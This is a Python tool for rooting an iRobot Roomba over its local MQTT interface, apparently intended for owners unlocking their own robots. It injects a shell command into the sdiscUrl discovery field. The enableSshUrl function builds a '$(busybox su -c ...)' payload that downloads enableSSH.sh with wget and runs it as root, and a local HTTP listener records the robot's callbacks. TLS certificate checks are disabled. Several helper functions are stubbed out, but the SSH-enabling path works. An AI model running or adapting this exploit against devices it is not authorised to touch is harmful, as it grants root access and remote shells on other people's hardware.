from http.server import HTTPServer, BaseHTTPRequestHandler

import threading
import paho.mqtt.client as mqtt
import ssl
import json
import argparse
import socket
import time

# connectivity_manager rejects any sdiscUrl longer than this (cmp r0,0xbf at 0x101d0).
SDISCURL_MAX_BYTES = 191

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8', 80))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

httpd : HTTPServer|None = None

LOCAL_IP = None
mqttc = None
PENDING_URLS: list[str] = []
SEND_DELAY = 1.5
DELTA = "delta"
RUNJAILED_HOME = "/data/opt/irobot/persistent/opt/runjailed"
AVAILABLE_CMD_SPACE = 1

def sendCmd(cmd: str):
    """Publish the raw string as state.sdiscUrl on topic wifictl.

    True only means Paho accepted the publish locally. It does not confirm
    broker delivery, robot processing, or shell execution.
    """
    if not isinstance(cmd, str) or len(cmd.encode()) > 191:
        raise ValueError("cmd must be a string of at most 191 bytes")
    if mqttc is None:
        raise RuntimeError("MQTT client is not initialized")
    result = mqttc.publish("wifictl", json.dumps({"state": {"sdiscUrl": cmd}}), qos=1)
    return result.rc == mqtt.MQTT_ERR_SUCCESS

def sendChunkedCommand(cmd: str, file: str|None = "I", display: str|None = None):
    raise NotImplementedError("Shell commands are unsupported: sendCmd only configures a discovery URL")


def runAsRoot(cmd: str, file:str="I"):
    raise NotImplementedError("Root commands are unsupported: sendCmd only configures a discovery URL")


def enableSshUrl(host: str, port: int = 8899, busybox: str = "/bin/busybox") -> str:
    """Build the sdiscUrl payload that makes connectivity_manager fetch and run
    enableSSH.sh as root (busybox is setuid and allowed for the apps user).

    The whole payload must stay within SDISCURL_MAX_BYTES.
    """
    remote = f"wget -qO/tmp/e http://{host}:{port}/enableSSH.sh;sh /tmp/e {host} {port}"
    url = f"https://$({busybox} su -c '{remote}')"
    if len(url.encode()) > SDISCURL_MAX_BYTES:
        raise ValueError(f"payload is {len(url.encode())} bytes, max {SDISCURL_MAX_BYTES}")
    return url


def on_connect(client, userdata, flags, reason_code, properties):
    print("Connected successfully!")
    client.subscribe("$SYS/#")
    if PENDING_URLS:
        urls, PENDING_URLS[:] = list(PENDING_URLS), []
        threading.Thread(target=_send_all, args=(client, urls, SEND_DELAY), daemon=True).start()


def _send_all(client, urls, delay):
    for url in urls:
        try:
            ok = sendCmd(url)
            print(f"sendCmd rc={ok} bytes={len(url.encode())}: {url}")
        except (ValueError, RuntimeError) as exc:
            print(f"sendCmd failed for {url!r}: {exc}")
        time.sleep(delay)
    client.disconnect()

def on_message(client, userdata, msg):
    # $SYS/# and other broker traffic is not JSON; a raising callback kills loop_forever().
    if "shadow/update" not in msg.topic:
        return
    try:
        pl = json.loads(msg.payload)
        robotDat = pl['state']['reported']
    except (ValueError, KeyError, TypeError):
        return
    print("Discovered: " + robotDat.get('sku', '?') + " on " + robotDat.get('softwareVer', '?'))

    print("Automatic jailbreak workflow is disabled: sendCmd only configures a discovery URL.")

class RunjailedHTTPHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args): pass

    def do_GET(self):
        self.send_response(200)
        
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        
        if "done/downloading" in self.path:
          print("[SUCCESS] Downloaded all scripts, now unlocking!")
        if "done/unlocking" in self.path:
          print("[SUCCESS] Unlocked!")
        if "done/ssh" in self.path:
          print("[SUCCESS] Enabled SSH!")
        if "done/http" in self.path:
          print("[SUCCESS] Enabled HTTP!")
        if "whoami/" in self.path:
          usr = self.path.split("whoami/")[1]
          pref = "[SUCCESS]" if "root" in usr else "[FAIL?]"
          print(f"{pref} Running script on Roomba as {usr}.")
        if "version/" in self.path:
          ver = self.path.split("version/")[1]
          print(f"[SUCCESS] Downloaded roomba::unjailed v{ver} to Roomba.")

def main():
    global LOCAL_IP, httpd, mqttc, SEND_DELAY
    parser = argparse.ArgumentParser("runjailed")
    parser.add_argument("--ip", "-i", dest="ip", help="Your robot's IP", required=True, type=str)
    parser.add_argument("--blid", "-b", dest="blid", help="Your robot's BLID", required=True, type=str)
    parser.add_argument("--password", "-p", dest="password", help="Your robot's password", required=True, type=str)
    parser.add_argument("--callback", "-c", dest="cb", help="Your computer's LAN IP", required=False, type=str)
    parser.add_argument("--send", dest="send", action="append", default=[], metavar="URL",
                        help="publish this state.sdiscUrl value after connecting (repeatable)")
    parser.add_argument("--enable-ssh", dest="enable_ssh", metavar="HOST[:PORT]",
                        help="publish the payload that runs enableSSH.sh on the robot as root")
    parser.add_argument("--send-delay", dest="send_delay", type=float, default=1.5,
                        help="seconds between publishes (default 1.5)")

    args = parser.parse_args()

    urls = list(args.send)
    if args.enable_ssh:
        host, _, port = args.enable_ssh.partition(":")
        urls.append(enableSshUrl(host, int(port or 8899)))

    LOCAL_IP = args.cb or get_local_ip()

    server_address = ('', 8883)
    httpd = HTTPServer(server_address, RunjailedHTTPHandler)

    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()

    mqttc = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
    mqttc.on_connect = on_connect
    mqttc.on_message = on_message
    PENDING_URLS[:] = urls
    SEND_DELAY = args.send_delay

    mqttc.tls_set(cert_reqs=ssl.CERT_NONE)
    mqttc.tls_insecure_set(True) # The certificate is now expired. Expired on Dec 31 2025.

    mqttc.username_pw_set(args.blid,args.password)
    mqttc.connect(args.ip, 8883, 60)

    mqttc.loop_forever()


if __name__ == "__main__":
    main()
